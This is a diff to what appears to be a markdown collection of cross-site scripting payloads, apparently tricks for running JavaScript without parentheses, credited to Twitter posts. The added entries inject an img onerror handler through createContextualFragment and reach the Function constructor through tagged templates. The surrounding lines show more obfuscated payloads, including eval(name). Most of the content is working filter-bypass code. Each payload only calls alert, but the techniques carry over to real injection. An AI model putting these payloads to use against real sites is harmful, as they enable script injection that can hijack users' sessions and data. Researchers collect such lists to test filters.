@@ -181,6 +181,13 @@ location='javascript'+':'+x
     
 --- 
 
+[BitK](https://twitter.com/BitK_/status/1298225144234729473)
+
+    range = document.createRange``; 
+    range.createContextualFragment`<img src=x onerror=alert\x2823\x29>'`;
+    
+--- 
+
 [BitK](https://twitter.com/BitK_/status/1239620001776185344?)
 
     Function`a${`${Function`a${`return from`}{from}``${Array}``96${Function`a${`return fromCharCode`}{fromCharCode}``${String}`}`}${Function`a${`return fromCharCode`}{fromCharCode}``${String}``${96}${10}${97}${108}${101}${114}${116}${40}${50}${51}${41}`}`}```
@@ -208,6 +215,12 @@ xss.html
 xss.html
 
     [].every.call`eval\x28name\x29${eval}`
+    
+---
+
+[Tomer Zait](https://twitter.com/realgam3/status/1298290461371662337)
+
+    []["filter"]["constructor"]`alert\x2823\x29```
     
 ---
 
